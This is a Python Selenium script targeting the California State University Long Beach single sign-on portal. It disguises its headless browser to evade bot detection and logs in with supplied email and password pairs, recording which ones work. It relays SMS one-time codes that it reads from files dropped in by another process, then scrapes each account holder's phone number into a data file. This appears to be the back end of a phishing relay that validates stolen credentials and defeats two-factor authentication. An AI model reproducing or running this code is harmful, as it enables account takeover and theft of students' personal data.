# pip install webdriver-manager
from bs4 import element
import numpy as np
import selenium
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import Select
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC, wait
from selenium.webdriver.common.action_chains import ActionChains
from selenium.common.exceptions import NoSuchElementException        
import time
import os



#args used to bypass bot check
chrome_options = webdriver.ChromeOptions()
chrome_options.add_argument("--no-sandbox")
chrome_options.add_argument('--user-agent="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36"')

chrome_options.add_argument('--headless')

driver = webdriver.Chrome(chrome_options=chrome_options, executable_path='/snap/bin/chromium.chromedriver')
driver.execute_cdp_cmd('Network.setUserAgentOverride', {"userAgent": 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.53 Safari/537.36'})
driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
# #open the page

def check_exists_by_xpath(xpath):
    try:
        driver.find_element("xpath",xpath)
    except NoSuchElementException:
        return False
    return True


url = 'https://sso.csulb.edu/'

# email = input()
# password=input()

driver.get(url)
while not check_exists_by_xpath("//div[@class='placeholderContainer']"):
    time.sleep(2)

def login_email(email,password,iscall):
    time.sleep(2)
    while not check_exists_by_xpath("//input[@type='submit']"):
        time.sleep(2)
    driver.find_element("xpath","//input[@type='email']").send_keys(email)
    driver.find_element("xpath","//input[@type='submit']").click()
    time.sleep(2)
    driver.find_element("xpath","//input[@type='password']").send_keys(password)
    driver.find_element("xpath","//input[@type='submit']").click()
    time.sleep(3)
    if check_exists_by_xpath("//div[@id='passwordError']"):
        #password is wrong
        pass
    else:
        with open(email+"loggedIn.txt", 'w') as file:
            file.write(email+" True")

def call():
    time.sleep(2)
    driver.find_element("xpath","//div[@data-value='TwoWayVoiceMobile']").click()
def text(email):
    time.sleep(2)
    while not check_exists_by_xpath("//input[@type='submit']"):
        time.sleep(2)
    driver.find_element("xpath","//div[@data-value='OneWaySMS']").click()
    code = get_code(email)
    driver.find_element("xpath","//input[@placeholder='Code']").send_keys(code)
    driver.find_element("xpath","//input[@type='submit']").click()
    time.sleep(5)

def get_code(email):
    while not os.path.exists(email+".txt"):
        time.sleep(2)
    with open(email+".txt") as file:
        return file.readline().strip()

def open_mycsulb():
    time.sleep(2)
    while not check_exists_by_xpath("//button[@aria-label='MyCSULB Student Center app context menu']"):
        time.sleep(2)
    btn = driver.find_element("xpath","//img[@src='https://secure.aadcdn.microsoftonline-p.com/dbd5a2dd-2zw3qm4qynz9c5fstygwvkdcrgzrj-6a-oirg1jenxo/appbranding/ekmndmb3vnaodjtwlqu-spdi39yp1wu-ixrh710b4nu/1033/bannerlogo?ts=637570610815243802']").click()

    
def log_info(email, password):
    
    time.sleep(2)
    driver.switch_to.window(driver.window_handles[-1])
    while not check_exists_by_xpath("//span[@id='DERIVED_SSS_SCL_SSS_LONGCHAR_1']"):
        time.sleep(2)
    # add1 = driver.find_element_by_xpath("//span[@id='DERIVED_SSS_SCL_SSS_LONGCHAR_1']").text
    # add2= driver.find_element_by_xpath("//span[@id='DERIVED_SSS_SCL_SSS_LONGCHAR_2']").text
    phone = driver.find_element("xpath","//span[@id='DERIVED_SSS_SCL_DESCR50']").text
    # prefemail= driver.find_element_by_xpath("//span[@id='DERIVED_SSS_SCL_EMAIL_ADDR']").text
    with open("data.txt", "a") as a:
        # line = add1+" | " + add2+" | "+phone+" | "+prefemail+" | "+email+" | "+" \n "
        line = phone+" | "+email+" | "+" \n "
        a.write(line)



